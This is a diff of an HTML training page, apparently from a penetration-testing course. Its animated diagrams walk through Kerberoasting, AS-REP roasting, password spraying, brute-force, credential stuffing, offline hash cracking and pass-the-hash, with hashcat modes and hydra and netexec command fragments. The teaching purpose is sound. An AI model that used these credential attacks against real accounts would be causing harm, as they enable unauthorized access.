-        <figcaption><b>Two messages leak crackable material.</b> The AS-REP (step 2) is encrypted with the <em>user's</em>
-           hash; the TGS-REP service ticket (step 4) is encrypted with the <em>service account's</em> hash. Request either,
-           take it offline, and crack.</figcaption>
+        <div class="pf-ctl">
+          <button type="button" data-pf="prev">&#8249; Back</button>
+          <button type="button" data-pf="play">&#9654; Play</button>
+          <button type="button" data-pf="next">Next &#8250;</button>
+          <span class="pf-count"></span>
+        </div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The user asks the KDC for a TGT, proving identity with a timestamp <b>encrypted with their own hash</b> (this is "pre-authentication").</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2 · BLEED 1</span>The KDC returns a <b>TGT</b> plus a blob keyed with the <i>user's</i> hash. If the account has <b>pre-auth disabled</b>, anyone can request this without credentials → <b>AS-REP roasting</b> (<span class="mono">-m 18200</span>, tool <span class="mono">GetNPUsers</span>).</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>To reach a service, the user presents the TGT and names an <b>SPN</b> (e.g. <span class="mono">MSSQLSvc/db01</span>). Any authenticated user may ask.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4 · BLEED 2</span>The KDC returns a <b class="hl">service ticket encrypted with the service account's hash</b> — and it hands it over to <i>anyone</i> who asks. Take it offline and crack the service password → <b>Kerberoasting</b> (<span class="mono">-m 13100</span>, tool <span class="mono">GetUserSPNs</span>). This is Lab 6.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The user presents the service ticket to the service, which trusts it because only the KDC could have minted it. Normal, legitimate access — the KDC never re-checks the user.</div>
+        <figcaption><b class="hl">Two messages leak crackable material.</b> The AS-REP (step 2) is keyed with the <em>user's</em> hash; the TGS-REP (step 4) with the <em>service account's</em> hash. Draw these five steps and both attacks stop being magic.</figcaption>
       </figure>
 
       <div class="split">
@@ -1125,7 +1178,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
     <text class="d-title" x="300" y="166" text-anchor="middle" font-size="16" fill="#ff7043">ONLINE — the live login</text>
   </g>
   <g class="node" data-node="spray" tabindex="0"><rect x="140" y="230" width="150" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="215" y="261" text-anchor="middle" font-size="15">Spraying</text></g>
-  <rect x="310" y="230" width="150" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="385" y="261" text-anchor="middle" font-size="15">Brute-force</text>
+  <g class="node" data-node="brute" tabindex="0"><rect x="310" y="230" width="150" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="385" y="261" text-anchor="middle" font-size="15">Brute-force</text></g>
   <g class="node" data-node="credstuff" tabindex="0"><rect x="140" y="292" width="320" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="300" y="323" text-anchor="middle" font-size="15">Credential stuffing</text></g>
   <path d="M300,192 L215,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
   <path d="M300,192 L385,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
@@ -1135,7 +1188,7 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
     <rect x="600" y="130" width="360" height="60" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
     <text class="d-title" x="780" y="166" text-anchor="middle" font-size="16" fill="#ff7043">OFFLINE — a stolen hash</text>
   </g>
-  <rect x="548" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="620" y="261" text-anchor="middle" font-size="15">Dictionary</text>
+  <g class="node" data-node="dict" tabindex="0"><rect x="548" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="620" y="261" text-anchor="middle" font-size="15">Dictionary</text></g>
   <g class="node" data-node="rules" tabindex="0"><rect x="708" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="780" y="261" text-anchor="middle" font-size="15">Rule-based</text></g>
   <g class="node" data-node="mask" tabindex="0"><rect x="868" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="940" y="261" text-anchor="middle" font-size="15">Mask</text></g>
   <rect x="548" y="292" width="465" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="780" y="323" text-anchor="middle" font-size="15">Hybrid / rainbow tables</text>
@@ -1150,15 +1203,252 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
     <text class="d-lbl" x="1300" y="192" text-anchor="middle" font-size="14" style="fill:var(--text-3)">skip cracking — the hash IS the credential</text>
   </g>
 </svg>
-        <div class="dgm-hint">Click a node — when to use it, and its one constraint.</div>
-        <div class="dgm-detail" data-detail="online"><h5><span class="dd-tag">ONLINE</span>Attacking the live login</h5><p><b>You send guesses at a running service</b> (SMB, RDP, SSH, a web form). Slow, and <em>noisy</em> — every attempt is logged, and a <strong>lockout policy</strong> will lock the account after N tries. Rate-limited and detectable. Tools: hydra, medusa, netexec.</p></div>
-        <div class="dgm-detail" data-detail="spray"><h5><span class="dd-tag">ONLINE</span>Password spraying</h5><p><b>One password, tried against many accounts.</b> The inversion of brute-force: instead of many passwords vs one account (which trips lockout), try <span class="mono">Autumn2025!</span> against everyone — one attempt each stays under the threshold. The single most effective real-world domain attack. Lab 4.</p></div>
-        <div class="dgm-detail" data-detail="credstuff"><h5><span class="dd-tag">ONLINE</span>Credential stuffing</h5><p><b>Reusing username+password pairs from a breach dump</b> against a target, betting on password reuse. Not "guessing" — replaying known-good credentials. Defeated only by unique passwords + MFA.</p></div>
-        <div class="dgm-detail" data-detail="offline"><h5><span class="dd-tag">OFFLINE</span>Attacking a stolen hash</h5><p><b>You already have the hash</b> (from SAM, NTDS, a capture, a roast). Now there's <em>no</em> lockout, <em>no</em> rate limit, <em>no</em> log on the target — you can try billions of guesses on your own GPU. This is where hashcat and John live, and why stealing a hash is the game-changer.</p></div>
-        <div class="dgm-detail" data-detail="rules"><h5><span class="dd-tag">OFFLINE</span>Rule-based</h5><p><b>Mutate a wordlist with rules</b> — capitalise, append <span class="mono">123</span>, swap <span class="mono">a→@</span>. <span class="mono">rockyou + best64.rule</span> turns 14M words into billions of realistic human passwords, cheaply. The highest-yield offline technique against human-chosen passwords.</p></div>
-        <div class="dgm-detail" data-detail="mask"><h5><span class="dd-tag">OFFLINE</span>Mask attack</h5><p><b>Brute-force with a known pattern.</b> If you know the policy is "8 chars, ends in a digit," a mask like <span class="mono">?u?l?l?l?l?l?l?d</span> searches only that space instead of everything — brute-force made tractable by structure.</p></div>
-        <div class="dgm-detail" data-detail="pth"><h5><span class="dd-tag">SHORTCUT</span>Pass-the-hash (T1550.002)</h5><p><b>You don't always need the plaintext.</b> NTLM authenticates <em>with the hash</em> — so an NT hash <em>is</em> the credential. Feed it straight to <span class="mono">nxc ... -H &lt;hash&gt;</span> or <span class="mono">psexec</span> and authenticate without ever cracking. The whole reason a strong password doesn't save a machine once its hash leaks. Lab 6.</p></div>
-      </figure>
+        <div class="dgm-hint">Click any attack — <b>watch it happen</b> step by step (each replays when you reopen it).</div>
+
+        <div class="dgm-detail" data-detail="online"><h5><span class="dd-tag">ONLINE</span>Attacking the live login</h5><p><b>You send guesses at a running service</b> (SMB, RDP, SSH, a web form). Slow and <em>noisy</em> — every attempt is logged and a <strong>lockout policy</strong> locks the account after N tries. Click <b>Brute-force</b> and <b>Spraying</b> below to see the difference play out.</p></div>
+
+        <div class="dgm-detail" data-detail="brute">
+        <h5><span class="dd-tag">ONLINE</span>Brute-force &mdash; many passwords, one account</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 322" role="img" aria-label="Brute-force sequence: the attacker tries many passwords against one account until the lockout policy locks it.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">hydra</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-P rockyou.txt</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--green)">Login &middot; admin</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">lockout: 5 tries</text>
+          <line x1="185" y1="84" x2="185" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="470" y="110" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">1 &middot; try "password"  &rarr;  &#10007; 1/5</text>
+          <path d="M191,124 L749,124" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">2 &middot; try "123456"  &rarr;  &#10007; 2/5</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">3 &middot; try "qwerty"  &rarr;  &#10007; 3/5</text>
+          <path d="M191,232 L749,232" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="470" y="272" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">4 &middot; ACCOUNT LOCKED (5 tries)</text>
+          <path d="M749,286 L191,286" fill="none" stroke="var(--red)" stroke-width="2.2" marker-end="url(#ar-r)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>First guess against the <b>admin</b> account. One failed logon = one <span class="mono">4625</span>.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Second guess, same account. The counter climbs toward the lockout threshold.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Third miss. A monitored domain already sees a burst of 4625 from one source.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The policy locks the account (<span class="mono">4740</span>) and the attack <b>stalls</b>. Loud, slow, and it defeats itself.</div>
+        </figure>
+        <p class="atk-cap"><b>Many passwords against ONE account</b> &rarr; trips the lockout fast. This is exactly why spraying exists.</p>
+        </div>
+        <div class="dgm-detail" data-detail="spray">
+        <h5><span class="dd-tag">ONLINE</span>Spraying &mdash; one password, many accounts</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 322" role="img" aria-label="Spraying sequence: the attacker tries one password against many accounts, one attempt each, staying under the lockout, until one account reuses it.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">netexec (nxc)</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-p one password</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--green)">Domain accounts</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">one try each</text>
+          <line x1="185" y1="84" x2="185" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="470" y="110" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">1 &middot; alice &larr; "Autumn2025!"  &rarr;  &#10007;</text>
+          <path d="M191,124 L749,124" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">2 &middot; bob &larr; "Autumn2025!"  &rarr;  &#10007;</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">3 &middot; carol &larr; "Autumn2025!"  &rarr;  &#10003; IN</text>
+          <path d="M749,232 L191,232" fill="none" stroke="var(--green)" stroke-width="2.2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="264" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="284" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">one try per account &rarr; never reaches the lockout threshold</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>One attempt against <b>alice</b> &mdash; a single 4625, nowhere near her lockout counter.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Move to the next account, not the next password. Each account still has only one miss.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span><b>carol reused the password</b> &mdash; authenticated. It only ever takes one.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Because no single account gets more than one miss, the lockout never fires. Quiet where brute-force is loud. Lab 4.</div>
+        </figure>
+        <p class="atk-cap"><b class="hl">One password against MANY accounts</b> &rarr; slips under lockout. The most effective real-world domain attack.</p>
+        </div>
+        <div class="dgm-detail" data-detail="credstuff">
+        <h5><span class="dd-tag">ONLINE</span>Credential stuffing &mdash; replay a breach</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 268" role="img" aria-label="Credential stuffing sequence: the attacker replays username and password pairs leaked from another site against the target, succeeding where a user reused the password.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">hydra -C</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">breach combo list</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--green)">Target login</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">trusts valid creds</text>
+          <line x1="185" y1="84" x2="185" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="102" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="122" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">breach dump from another site:  bob@corp : Summer21!</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">2 &middot; replay bob@corp : Summer21!</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--orange)" stroke-width="2.2" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">3 &middot; password reused  &rarr;  &#10003; IN</text>
+          <path d="M749,232 L191,232" fill="none" stroke="var(--green)" stroke-width="2.2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>These are <b>known-good pairs</b> leaked elsewhere &mdash; not guesses.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Send the exact leaked pair at the target login. To the server it looks like bob signing in.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span><b>bob reused it here too</b> &rarr; authenticated first try. Defeated only by unique passwords + MFA.</div>
+        </figure>
+        <p class="atk-cap"><b>Not guessing &mdash; replaying</b> credentials that already work somewhere. Betting on reuse.</p>
+        </div>
+        <div class="dgm-detail" data-detail="offline"><h5><span class="dd-tag">OFFLINE</span>Attacking a stolen hash</h5><p><b>You already have the hash</b> (SAM, NTDS, a capture, a roast). <em>No</em> lockout, <em>no</em> rate limit, <em>no</em> log on the target — billions of guesses on your own GPU. Click <b>Dictionary</b>, <b>Rule-based</b> and <b>Mask</b> to watch each candidate strategy.</p></div>
+
+        <div class="dgm-detail" data-detail="dict">
+        <h5><span class="dd-tag">OFFLINE</span>Dictionary &mdash; hash each word, compare</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 322" role="img" aria-label="Dictionary attack: the GPU hashes each word in a list and compares it to the stolen hash locally, matching when a word hashes to the same value.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">hashcat</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-a 0 rockyou</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--cyan)">Stolen hash &middot; local</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">5f4dcc3b5a&hellip;</text>
+          <line x1="185" y1="84" x2="185" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="298" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="102" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="122" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">load the stolen hash locally &mdash; no target contact</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">hash("123456") &rarr; compare &rarr; &#10007;</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">hash("password") = 5f4dcc3b5a&hellip; &rarr; &#10003; MATCH</text>
+          <path d="M191,232 L749,232" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="264" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="284" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">no packet left your box &rarr; no lockout, no log</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>You already own the hash (SAM, NTDS, a capture). Everything now happens on <b>your</b> box.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Hash the first candidate and compare to the target. No match &mdash; try the next, billions per second.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>A word hashes to the exact stolen value &rarr; <b>cracked</b>. Same word, same hash, every time.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The whole attack is offline &mdash; the defender never sees it. This is why stealing a hash changes the game.</div>
+        </figure>
+        <p class="atk-cap"><b>Hash every word, compare to the stolen hash.</b> Silent and unlimited &mdash; the opposite of online.</p>
+        </div>
+        <div class="dgm-detail" data-detail="rules">
+        <h5><span class="dd-tag">OFFLINE</span>Rule-based &mdash; mutate the wordlist</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 268" role="img" aria-label="Rule-based attack: each base word is mutated by rules into many realistic variants, each hashed and compared to the stolen hash.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">hashcat</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-r best64.rule</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--cyan)">Stolen hash &middot; local</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">target hash</text>
+          <line x1="185" y1="84" x2="185" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="102" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="122" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">base word from rockyou:  "password"</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">best64.rule &rarr; Password1 &middot; P@ssw0rd &middot; password123</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--orange)" stroke-width="2" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">hash("P@ssw0rd") = target &rarr; &#10003; CRACKED</text>
+          <path d="M191,232 L749,232" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Humans do not use raw words &mdash; they decorate them. Rules model exactly how.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>One rule set turns 14M words into <b>billions</b> of realistic variants &mdash; capitalise, append digits, swap <span class="mono">a&rarr;@</span>.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>A mutated variant matches. This is the <b>highest-yield</b> offline technique against human passwords.</div>
+        </figure>
+        <p class="atk-cap"><b>Wordlist &times; rules</b> = the realistic human keyspace, cheaply.</p>
+        </div>
+        <div class="dgm-detail" data-detail="mask">
+        <h5><span class="dd-tag">OFFLINE</span>Mask &mdash; brute only the pattern</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 268" role="img" aria-label="Mask attack: knowing the password policy, the attacker brute-forces only the character pattern the policy forces, matching far faster than a full brute-force.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">hashcat</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-a 3 ?u?l?l?l?d</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--cyan)">Stolen hash &middot; local</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">target hash</text>
+          <line x1="185" y1="84" x2="185" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="102" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="122" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">known policy: Upper + 5 lower + digit (8 chars)</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">mask ?u?l?l?l?l?l?d &rarr; only THAT space</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--orange)" stroke-width="2" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">"Summer7" found in seconds &rarr; &#10003; CRACKED</text>
+          <path d="M191,232 L749,232" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>When you know the <b>shape</b> a policy forces, you never search the shapes it forbids.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Brute-force, but restricted to the pattern &mdash; a tiny fraction of the full keyspace.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Structure makes brute-force tractable. Policy that is <em>too</em> predictable helps the attacker.</div>
+        </figure>
+        <p class="atk-cap"><b>Brute-force made tractable by structure</b> &mdash; search only the shape the policy forces.</p>
+        </div>
+        <div class="dgm-detail" data-detail="pth">
+        <h5><span class="dd-tag">SHORTCUT</span>Pass-the-hash &mdash; skip cracking entirely</h5>
+        <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 268" role="img" aria-label="Pass-the-hash sequence: the attacker presents a stolen NT hash directly as the credential; NTLM accepts it without the plaintext, so no cracking is needed.">
+          <rect x="60" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="185" y="58" text-anchor="middle" font-size="14" fill="var(--orange)">netexec (nxc)</text>
+          <text class="d-sub" x="185" y="74" text-anchor="middle">-H &lt;NT hash&gt;</text>
+          <rect x="630" y="34" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="755" y="58" text-anchor="middle" font-size="14" fill="var(--green)">Service &middot; SMB</text>
+          <text class="d-sub" x="755" y="74" text-anchor="middle">speaks NTLM</text>
+          <line x1="185" y1="84" x2="185" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="755" y1="84" x2="755" y2="244" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="102" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="122" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">stolen NT hash:  aad3b4&hellip; : 31d6cf&hellip;  (no plaintext)</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="164" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">2 &middot; present the HASH as the credential</text>
+          <path d="M191,178 L749,178" fill="none" stroke="var(--orange)" stroke-width="2.2" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="470" y="218" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">3 &middot; NTLM accepts  &rarr;  &#10003; authenticated</text>
+          <path d="M749,232 L191,232" fill="none" stroke="var(--green)" stroke-width="2.2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>From a SAM dump, NTDS, or LSASS. You never recovered the password &mdash; and you do not need to.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span><span class="mono">nxc smb host -u admin -H &lt;hash&gt;</span> &mdash; NTLM authenticates <em>with the hash itself</em>.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Access granted with <b>no cracking step</b> (T1550.002). A 30-char password is no comfort once its hash leaks.</div>
+        </figure>
